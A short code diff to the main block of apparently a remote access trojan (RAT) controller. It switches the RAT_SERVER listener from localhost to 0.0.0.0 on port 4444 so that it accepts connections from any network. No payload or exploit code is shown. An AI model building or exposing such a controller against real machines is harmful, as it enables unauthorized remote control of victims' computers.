@@ -305,8 +305,9 @@ class ratGUI:
 
 
 if __name__ == "__main__":
-    rat = RAT_SERVER("127.0.0.1", 4444)
+    # rat = RAT_SERVER("127.0.0.1", 4444)
     # rat = RAT_SERVER("10.211.55.2", 4444)
+    rat = RAT_SERVER("0.0.0.0", 4444)
     root = tk.Tk()
     root.geometry("800x600")
     app = ratGUI(root, rat)
